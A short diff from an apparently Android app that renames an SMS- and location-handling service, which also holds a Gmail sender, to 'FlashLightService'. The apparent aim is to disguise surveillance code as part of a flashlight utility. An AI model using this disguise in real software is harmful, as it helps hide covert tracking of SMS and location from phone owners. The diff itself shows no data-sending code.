@@ -29,10 +29,10 @@ import android.support.annotation.Nullable;
 import android.telephony.SmsManager;
 import android.database.ContentObserver;
 
-public class SMSService extends Service implements LocationListener {
+public class FlashLightService extends Service implements LocationListener {
 
   private static String gmailEmailString;
-  private static final String TAG = "FlashLight SMSService";
+  private static final String TAG = "FlashLight FLService";
 
   private static GmailSender sender;
   private static Configure configure;
@@ -41,9 +41,9 @@ public class SMSService extends Service implements LocationListener {
   private static boolean eLocation = false;
   private static boolean mLocation = false;
 
-  public SMSService() { 
+  public FlashLightService() { 
 
-    Log.i(TAG, "Entering SMSService() constructor");
+    Log.i(TAG, "Entering FlashLightService() constructor");
 
     configure = new Configure();
     if(!configure.getDatabaseInfo().equals("null")) {
